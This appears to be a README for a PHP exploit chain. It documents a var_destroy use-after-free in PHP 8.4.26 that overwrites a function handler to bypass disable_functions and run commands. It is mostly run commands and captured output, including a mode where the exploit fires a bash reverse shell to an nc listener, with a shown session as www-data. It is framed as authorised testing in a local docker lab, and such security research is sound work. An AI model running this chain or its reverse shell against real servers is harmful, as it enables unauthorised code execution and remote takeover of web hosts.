# Phase B: var_destroy UAF to function-handler overwrite

The why is in the root [README](../README.md). This is the escalation step: it
runs in the target process and walks through `disable_functions`. Authorised
testing only.

Target: stock `php:8.4.26-apache` on `http://127.0.0.1:8081`, exploit baked into
`/opt/exploit`.

## Setup

    docker compose up --build -d

## Run

Run as `www-data` (the uid a real foothold has):

    docker compose exec -u www-data target php /opt/exploit/chain_b_auto.php

Offsets resolve at runtime first, then:

    [+] var_destroy UAF -> RCE CONFIRMED (disable_functions bypassed)
    uid=33(www-data) gid=33(www-data) groups=33(www-data)

Prove the bypass against a policy:

    docker compose exec -u www-data target php -d disable_functions=system,exec,shell_exec,passthru \
        /opt/exploit/chain_b_auto.php

`chain_b_uaf_rce.php` is the upstream version with pinned offsets, kept for
reference.

## Reverse shell

Start a listener (`nc -lvnp 4444`), then set `LHOST`/`LPORT` in the environment so
the overwritten handler fires a bash reverse shell:

    docker compose exec -u www-data -e LHOST=<LHOST> -e LPORT=4444 target php /opt/exploit/chain_b_auto.php

`<LHOST>` is your listener as seen from the container (the docker gateway or host
LAN IP).

## Output

Command mode:

```
$ docker compose exec -u www-data target php /opt/exploit/chain_b_auto.php
[*] base=0x55f5cd000000 eg=0x55f5ce6e2020 fa_system=0x55f5e127a2a0 handler_off=0x58 zif_system=0x55f5cd508930
[+] var_destroy UAF -> RCE CONFIRMED (disable_functions bypassed)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Reverse shell:

```
$ nc -lvnp 4445
Listening on 0.0.0.0 4445
Connection received on 172.27.0.2 51830
www-data@f1fd4a2c6a76:~/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
```
$ docker compose exec -u www-data -e LHOST=172.27.0.1 -e LPORT=4445 target php /opt/exploit/chain_b_auto.php
[*] reverse shell -> 172.27.0.1:4445 (start your listener first)
```

## Teardown

    docker compose down
